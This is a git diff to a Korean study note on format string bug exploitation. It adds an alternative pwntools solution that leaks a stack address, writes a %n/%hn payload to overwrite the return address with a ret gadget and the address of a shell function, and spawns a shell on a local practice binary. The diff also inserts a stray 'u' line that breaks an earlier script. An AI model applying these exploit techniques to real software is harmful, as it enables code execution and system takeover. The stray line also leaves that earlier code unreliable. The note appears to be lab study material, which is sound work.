@@ -13,7 +13,7 @@ Format String Bug
 
 그러나 일반적으로 개발자들이 `printf`를 사용할 때는 문자열 형식 지정자를 명시적으로 사용하기 때문에 현재는 실제 개발 환경에서는 FSB 취약점이 발생할 확률이 상당히 낮음
 
-일반적으로 SFP는 FULL RELRO에서는 불가능함
+일반적으로 FSB는 FULL RELRO에서는 불가능함
 
 ---
 
@@ -212,7 +212,7 @@ shell_low_order=shell_syb&0xFFFF
 x86 이므로 아래와 같은 스크립트로 공격할 수 있음
 ```python
 from pwn import *
-
+u
 p=process("./FSB_32_shell")
 #p=gdb.debug("./FSB_32_shell")
 e=ELF("./FSB_32_shell")
@@ -372,10 +372,6 @@ shell_syb=e.symbols["shell"]+1 #0x401166
 shell_high_order=(shell_syb>>16)&0xFFFF
 shell_low_order=shell_syb&0xFFFF
 
-main_ret=0x40123c
-main_high_order=(main_ret>>16)&0xFFFF
-main_low_order=main_ret&0xFFFF
-
 payload=b''
 
 buf_addr=int(p.recvline()[2:],16)
@@ -419,6 +415,51 @@ uid=1000(foo**1**) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30
 $  
 
 
+```
+
+# 별해
+스택정렬 이슈를 평범하게 ret가젯 다음 shell 주소를 넣어서 해결함 
+```python
+from pwn import *
+context.terminal=['tmux', 'splitw', '-h']
+p = process('./FSB_EX')
+e = ELF('./FSB_EX')
+
+
+#0x0000000000401166
+buf = int(p.recv(14),16)
+print(buf)
+ret_addr = buf + 0xd8
+shell_low = 0x1166
+shell_high = 0x0040
+ret_low = 0x123c
+ret_high = 0x0040
+
+payload = b''
+payload += b'%'+str(ret_high).encode() + b'c'
+payload += b'%11$n'
+payload += b'%12$n'
+payload += b'%'+str(shell_low - shell_high).encode() + b'c'
+payload += b'%13$hn'
+payload += b'%' +str(ret_low - shell_low).encode() + b'c'
+payload += b'%14$hn'
+
+print(payload)
+print(len(payload))
+l = len(payload) 
+payload += b'a' * (8 - (l % 8))
+print(payload)
+print(len(payload))
+
+payload += p64(ret_addr+2)
+payload += p64(ret_addr+10)
+payload += p64(ret_addr+8)
+payload += p64(ret_addr)
+
+#0x000000000040123c
+
+p.send(payload)
+p.interactive()
 ```
 
 ---
